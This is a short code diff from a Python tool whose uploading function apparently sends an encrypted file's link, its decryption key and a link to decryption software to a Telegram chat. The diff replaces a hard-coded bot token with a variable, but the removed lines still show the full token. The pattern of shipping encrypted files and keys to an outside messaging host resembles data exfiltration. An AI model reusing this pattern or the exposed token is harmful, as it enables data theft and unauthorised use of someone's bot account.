@@ -333,9 +333,9 @@ def uploading():
                 url = data["data"]["file"]["url"]["full"]
                 s = requests.Session()
                 # s.proxies = {'https':'Proxy'}
-                response_ = s.request('GET',f'https://api.telegram.org/bot5402018435:AAGYU_e1fv7wljblE7qKnpIZvgPIv0dY4A4/sendmessage?chat_id={chat_id}&text=The Link To The Encrypted File: {url}')
-                response__ = s.request('GET',f'https://api.telegram.org/bot5402018435:AAGYU_e1fv7wljblE7qKnpIZvgPIv0dY4A4/sendmessage?chat_id={chat_id}&text=Your Decryption KEY is: {key_stripped}')
-                response___ = s.request('GET',f'https://api.telegram.org/bot5402018435:AAGYU_e1fv7wljblE7qKnpIZvgPIv0dY4A4/sendmessage?chat_id={chat_id}&text=The Link To The Decryption Software : https://github.com/Wolf-Of-Wall-Street/Project-NewWorld/blob/main/Decryption_Software.py')
+                response_ = s.request('GET',f'https://api.telegram.org/bot{API_Key}/sendmessage?chat_id={chat_id}&text=The Link To The Encrypted File: {url}')
+                response__ = s.request('GET',f'https://api.telegram.org/bot{API_Key}/sendmessage?chat_id={chat_id}&text=Your Decryption KEY is: {key_stripped}')
+                response___ = s.request('GET',f'https://api.telegram.org/bot{API_Key}/sendmessage?chat_id={chat_id}&text=The Link To The Decryption Software : https://github.com/Wolf-Of-Wall-Street/Project-NewWorld/blob/main/Decryption_Software.py')
             upload_state = True
 
 # Threads
